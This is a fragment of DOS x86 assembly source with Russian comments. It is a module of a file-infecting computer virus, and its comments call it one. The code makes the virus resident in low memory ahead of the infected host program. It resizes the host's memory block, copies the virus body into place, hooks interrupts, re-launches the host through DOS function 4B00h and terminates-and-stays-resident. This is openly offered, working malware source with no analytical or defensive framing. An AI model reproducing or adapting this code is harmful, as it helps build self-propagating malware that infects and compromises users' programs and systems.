;
;	Модуль резидентности в младших адресах памяти.
;
;	Что нужно, чтобы оставить вирус резидентным _перед_ зараженной
;	программой? Нужно записать резидентную часть поверх программы,
;	а саму программу запустить повторно.
;

;
;	Прежде всего надо сохранить параметры программы.
;
LowMemRes:
		
	mov ax,cs:FileSeg
	test cs:EXE_flag,1
	jz @l1
	sub ax,16
@l1:	mov ds,ax
	mov cs:RealSeg,ax	; настоящий сегмент MCB программы
;
;	Теперь вытаскиваем из окружения имя программы. RTFM.
;
	mov ds,ds:[2Ch]
	xor si,si
@l2:	lodsb
	or al,[si]
	jnz @l2
	lodsb
	lodsw
	push cs
	pop es
	mov cl,32
	lea di,ProgName
	rep movsw
		
	lea di,ExecParam
	xchg ax,cx
	stosw
	
	push cs
	pop ds
	
	push RealSeg
	push word ptr 80h
	pop eax
	stosd
	mov ax,5Ch
	stosd		; Все, мы создали все структуры данных для
	mov al,6Ch	; повторного запуска программы.
	stosd		; Теперь можно заняться собственной персоной.
	
	mov es,RealSeg
	mov bx,VirusSize+16
	mov ah,4Ah
	int 21h

	jc _Out_Of_memory	;ого! нам 5 килов не дали. Сматываемся...

	mov ax,es
	add ax,16
	mov es,ax
	
	mov cx,VirusSize*8-16
	xor si,si
	xor di,di
	rep movsw

	push es
	push cs
	pop es
	mov ah,49h
	int 21h		;освободили свой сегмент
	pop es

	push es
	push offset _Do_it
	retf
	
_Do_it:
	push cs		; новый стек
	pop ss	
	
	call NewInts
	
	push cs
	pop ds
	lea dx, ProgName
	lea bx,ExecParam
	mov ax,4B00h
	@CallInt21
	push cs
	pop ss
	lea sp,stack
	
	mov ah,4Dh
	int 21h

	mov ah,31h
	mov dx,VirusSize+16
	int 21h
_Out_Of_Memory:
	mov ah,4Ch
	int 21h
	
	